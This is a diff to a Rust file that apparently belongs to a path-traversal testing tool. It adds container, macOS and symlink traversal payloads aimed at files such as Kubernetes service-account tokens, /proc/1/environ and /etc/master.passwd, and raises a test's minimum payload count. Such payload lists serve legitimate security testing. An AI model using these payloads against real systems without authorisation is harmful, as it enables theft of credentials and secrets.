@@ -88,6 +88,24 @@ pub fn get_payloads() -> Vec<Payload> {
             ("..../..../..../..../etc/passwd", "Nginx off-by-slash", Severity::Critical),
             ("../../../etc/passwd%00", "Nginx null byte", Severity::High),
         ];
+        "container", [
+            ("../../../proc/1/rootfs/etc/passwd", "Container process rootfs read", Severity::Critical),
+            ("../../../var/run/secrets/kubernetes.io/serviceaccount/token", "Kubernetes service account token", Severity::Critical),
+            ("../../../proc/self/cgroup", "Container cgroup detection", Severity::High),
+            ("../../../etc/hostname", "Container hostname read", Severity::Medium),
+            ("../../../proc/1/environ", "Container PID 1 environment", Severity::Critical),
+        ];
+        "macos", [
+            ("../../../../etc/master.passwd", "macOS master password read", Severity::Critical),
+            ("../../../../Library/LaunchDaemons/com.apple_ssh.plist", "macOS launch daemon", Severity::High),
+            ("../../../../System/Library/LaunchDaemons/com.openssh.sshd.plist", "macOS SSH daemon plist", Severity::High),
+            ("../../../../var/db/dsl.ldb", "macOS Directory Service database", Severity::Critical),
+        ];
+        "symlink", [
+            ("/tmp/evil", "Symlink traversal target", Severity::Medium),
+            ("/proc/self/root", "Proc root symlink", Severity::High),
+            ("/dev/fd/0", "File descriptor traversal", Severity::High),
+        ];
     );
 
     for p in &mut payloads {
@@ -218,7 +236,7 @@ mod tests {
     fn minimum_payload_count() {
         let payloads = get_payloads();
         assert!(
-            payloads.len() >= 40,
+            payloads.len() >= 60,
             "Must have substantial traversal payload coverage, got {}",
             payloads.len()
         );
